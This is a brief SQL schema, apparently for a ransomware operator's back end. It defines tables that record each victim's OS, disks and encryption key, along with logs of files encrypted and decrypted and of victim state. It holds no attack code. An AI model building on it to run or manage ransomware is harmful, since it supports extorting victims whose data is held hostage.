CREATE TABLE victims(
id_victim INTEGER PRIMARY KEY,
os VARCHAR(100),
hash VARCHAR(100),
disks VARCHAR(100),
key VARCHAR(100)
);

CREATE TABLE decrypted(
	id_decrypted INTEGER PRIMARY KEY,
	id_victim INTEGER NOT NULL,
	datetime TIMESTAMP,
	nb_files INTEGER,
	FOREIGN KEY(id_victim) REFERENCES victims(id_victim)
);

CREATE TABLE states(
	id_state INTEGER PRIMARY KEY,
	id_victim INTEGER NOT NULL,
	datetime TIMESTAMP,
	state VARCHAR(100),
	FOREIGN KEY(id_victim) REFERENCES victims(id_victim)
);

CREATE TABLE encrypted(
	id_encrypted INTEGER PRIMARY KEY,
	id_victim INTEGER NOT NULL,
	datetime TIMESTAMP,
	nb_files INTEGER,
	FOREIGN KEY(id_victim) REFERENCES victims(id_victim)
);